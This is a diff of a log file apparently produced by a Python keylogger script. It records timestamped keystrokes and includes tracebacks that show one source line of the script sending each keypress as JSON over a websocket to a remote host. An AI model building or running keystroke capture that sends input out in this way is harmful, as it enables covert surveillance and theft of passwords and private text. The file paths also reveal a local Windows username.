@@ -1,31 +1,42 @@
-2020-05-29 16:59:01,049: Key.alt_l:
-2020-05-29 16:59:01,121: Key.tab:
-2020-05-29 16:59:01,417: Key.tab:
-2020-05-29 16:59:01,648: Key.tab:
-2020-05-29 16:59:03,057: Key.f5:
-2020-05-29 16:59:07,241: Key.f12:
-2020-05-29 16:59:09,825: 'a':
-2020-05-29 16:59:09,913: 's':
-2020-05-29 16:59:09,945: 'd':
-2020-05-29 16:59:23,281: Key.ctrl_l:
-2020-05-29 16:59:23,281: Unhandled exception in listener callback:
+2020-05-29 21:42:52,938: Key.alt_l:
+2020-05-29 21:42:52,997: Key.tab:
+2020-05-29 21:42:54,377: Key.alt_l:
+2020-05-29 21:42:54,431: Key.tab:
+2020-05-29 21:42:55,368: Key.alt_l:
+2020-05-29 21:42:55,448: Key.tab:
+2020-05-29 21:42:55,874: Key.tab:
+2020-05-29 21:42:58,525: Key.f5:
+2020-05-29 21:43:00,345: 'd':
+2020-05-29 21:43:00,448: 'a':
+2020-05-29 21:43:00,517: 's':
+2020-05-29 21:43:00,649: 'd':
+2020-05-29 21:43:00,801: 'a':
+2020-05-29 21:43:00,857: 's':
+2020-05-29 21:43:00,999: 'd':
+2020-05-29 21:43:01,113: 'a':
+2020-05-29 21:43:01,167: 's':
+2020-05-29 21:43:01,250: 'd':
+2020-05-29 21:43:03,186: Key.ctrl_l:
+2020-05-29 21:43:03,345: '\x16':
+2020-05-29 21:43:05,359: Key.alt_l:
+2020-05-29 21:43:05,359: Unhandled exception in listener callback:
 Traceback (most recent call last):
-  File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\pynput\_util\__init__.py", line 162, in inner
+  File "C:\Users\ionut\AppData\Local\Programs\Python\Python38-32\lib\site-packages\pynput\_util\__init__.py", line 162, in inner
     return f(self, *args, **kwargs)
-  File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\pynput\keyboard\_win32.py", line 280, in _process
+  File "C:\Users\ionut\AppData\Local\Programs\Python\Python38-32\lib\site-packages\pynput\keyboard\_win32.py", line 280, in _process
     self.on_press(key)
-  File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\pynput\_util\__init__.py", line 78, in inner
+  File "C:\Users\ionut\AppData\Local\Programs\Python\Python38-32\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
     if f(*args) is False:
-  File "keylogger.py", line 31, in on_press
-    ws.send('{"timestamp": "' + str(datetime.now()) + '" , "keyPressed": "' + str(key) + '" }')
-  File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\websocket\_core.py", line 253, in send
+  File "keylogger.py", line 37, in on_press
+    ws.send('{"timestamp": "' + str(datetime.now()) +
+  File "C:\Users\ionut\AppData\Local\Programs\Python\Python38-32\lib\site-packages\websocket\_core.py", line 253, in send
     return self.send_frame(frame)
-  File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\websocket\_core.py", line 279, in send_frame
+  File "C:\Users\ionut\AppData\Local\Programs\Python\Python38-32\lib\site-packages\websocket\_core.py", line 279, in send_frame
     l = self._send(data)
-  File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\websocket\_core.py", line 449, in _send
+  File "C:\Users\ionut\AppData\Local\Programs\Python\Python38-32\lib\site-packages\websocket\_core.py", line 449, in _send
     return send(self.sock, data)
-  File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\websocket\_socket.py", line 157, in send
+  File "C:\Users\ionut\AppData\Local\Programs\Python\Python38-32\lib\site-packages\websocket\_socket.py", line 157, in send
     return _send()
-  File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\websocket\_socket.py", line 139, in _send
+  File "C:\Users\ionut\AppData\Local\Programs\Python\Python38-32\lib\site-packages\websocket\_socket.py", line 139, in _send
     return sock.send(data)
 ConnectionResetError: [WinError 10054] An existing connection was forcibly closed by the remote host
